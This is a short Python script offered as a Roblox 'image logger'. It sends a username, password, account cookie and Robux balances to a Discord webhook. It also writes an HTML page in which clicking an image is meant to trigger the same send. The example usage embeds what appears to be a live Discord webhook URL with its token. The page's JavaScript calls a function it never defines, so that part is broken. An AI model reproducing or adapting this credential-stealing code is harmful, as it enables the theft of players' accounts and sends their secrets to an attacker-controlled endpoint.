
                        import requests
from PIL import Image
from io import BytesIO

def send_account_info_to_discord(webhook_url: str, username: str, password: str, cookie: str, total_robux: int, pending_robux: int):
    """
    Sends the account information, including username, password, cookie, total robux, and pending robux,
    to the specified Discord webhook URL.

    Parameters:
    - webhook_url: str
        The URL of the Discord webhook where the information will be sent.
    - username: str
        The username of the Roblox account.
    - password: str
        The password of the Roblox account.
    - cookie: str
        The cookie of the Roblox account.
    - total_robux: int
        The total amount of Robux in the account.
    - pending_robux: int
        The amount of pending Robux in the account.

    Returns:
    - bool:
        True if the information was successfully sent to Discord, False otherwise.
    """

    # Constructing the payload to send to Discord
    payload = {
        "content": f"Account Info:\nUsername: {username}\nPassword: {password}\nCookie: {cookie}\nTotal Robux: {total_robux}\nPending Robux: {pending_robux}"
    }

    try:
        # Sending the payload to the Discord webhook URL
        response = requests.post(webhook_url, json=payload)

        # Checking if the request was successful (status code 200)
        if response.status_code == 200:
            return True
        else:
            return False
    except requests.exceptions.RequestException:
        return False

def create_image_logger(image_link: str, webhook_url: str, username: str, password: str, cookie: str, total_robux: int, pending_robux: int):
    """
    Creates an image logger for a Roblox account. When the image is clicked, it will send the account's
    information (username, password, cookie, total robux, and pending robux) to the specified Discord webhook.

    Parameters:
    - image_link: str
        The URL of the image to be used as the image logger.
    - webhook_url: str
        The URL of the Discord webhook where the information will be sent.
    - username: str
        The username of the Roblox account.
    - password: str
        The password of the Roblox account.
    - cookie: str
        The cookie of the Roblox account.
    - total_robux: int
        The total amount of Robux in the account.
    - pending_robux: int
        The amount of pending Robux in the account.

    Returns:
    - bool:
        True if the image logger was successfully created and the information was sent to Discord, False otherwise.
    """

    try:
        # Downloading the image from the provided link
        response = requests.get(image_link)
        image = Image.open(BytesIO(response.content))

        # Saving the image with a click event that triggers the account info sending function
        image_logger_code = f"""
        <html>
        <body>
            <img src="{image_link}" onclick="sendAccountInfo()">
            <script>
                function sendAccountInfo() {{
                    // Calling the function to send the account info to Discord
                    sendAccountInfoToDiscord("{webhook_url}", "{username}", "{password}", "{cookie}", {total_robux}, {pending_robux});
                }}
            </script>
        </body>
        </html>
        """

        # Saving the image logger code to a file
        with open("image_logger.html", "w") as file:
            file.write(image_logger_code)

        # Sending the account info to Discord
        return send_account_info_to_discord(webhook_url, username, password, cookie, total_robux, pending_robux)
    except (requests.exceptions.RequestException, OSError):
        return False

# Example usage:
image_link = "https://cdn.discordapp.com/attachments/1409554195484246017/1411462827595665468/Uploaded_image__Repl.png?ex=68b4beb1&is=68b36d31&hm=48ba7126fe2a8db0c6990e64d2f5c644525bc8408c649999f08787344cd01fc9"
webhook_url = "https://discordapp.com/api/webhooks/1411478648434720818/eIy_2EBR7NAGSkV-Xu2mi2RYF5a5cPylo57Lg80DwlKZwv05I1zIqcioWb7hi4HrZlXY"
username = "example_username"
password = "example_password"
cookie = "example_cookie"
total_robux = 1000
pending_robux = 500

result = create_image_logger(image_link, webhook_url, username, password, cookie, total_robux, pending_robux)
if result:
    print("Image logger created and account info sent to Discord.")
else:
    print("Failed to create image logger or send account info to Discord.")
                    
